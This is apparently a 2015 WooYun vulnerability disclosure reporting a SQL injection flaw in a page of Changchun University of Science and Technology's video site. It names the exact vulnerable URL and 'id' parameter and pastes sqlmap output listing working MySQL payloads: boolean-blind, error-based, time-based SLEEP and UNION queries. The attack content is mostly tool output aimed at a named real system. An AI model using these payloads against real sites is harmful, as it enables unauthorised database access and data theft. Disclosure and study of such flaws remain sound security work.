wybug_title: 长春理工某网站SQL注入漏洞
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-29：	细节已通知厂商并且等待厂商处理中									2015-08-03：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 长春理工某网站SQL注入漏洞 详细说明：  1.长春理工大学党委宣传部http://video.cust.edu.cn/page/mainPage.php?id=0000000134

2.SQL注入漏洞[!] Injection:video.cust.edu.cn/page/mainPage.php?id=0000000134	[*] data=[{u'status': 1, u'type': 0, u'value': [{u'dbms': u'MySQL', u'suffix': u'', u'clause': [1], u'ptype': 1, u'dbms_version': [u'>= 5.0'], u'prefix': u'', u'place': u'GET', u'data': {u'1': {u'comment': u'', u'matchRatio': None, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u'id=0000000134 AND 1835=1835'}, u'2': {u'comment': u'', u'matchRatio': None, u'title': u'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause', u'templatePayload': None, u'vector': u"AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", u'where': 1, u'payload': u'id=0000000134 AND (SELECT 1216 FROM(SELECT COUNT(*),CONCAT(0x7171627871,(SELECT (ELT(1216=1216,1))),0x7162706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'}, u'5': {u'comment': u'', u'matchRatio': None, u'title': u'MySQL >= 5.0.12 AND time-based blind (SELECT)', u'templatePayload': None, u'vector': u'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', u'where': 1, u'payload': u'id=0000000134 AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))RzYh)'}, u'6': {u'comment': u'-- ', u'matchRatio': None, u'title': u'Generic UNION query (NULL) - 1 to 20 columns', u'templatePayload': None, u'vector': [1, 3, u'-- ', u'', u'', u'NULL', 2, False, False], u'where': 2, u'payload': u'id=-7761 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x557545494b5a48547463,0x7162706b71),NULL-- '}}, u'conf': {u'string': None, u'notString': None, u'titles': False, u'regexp': None, u'textOnly': False, u'optimize': False}, u'parameter': u'id', u'os': None}]}]
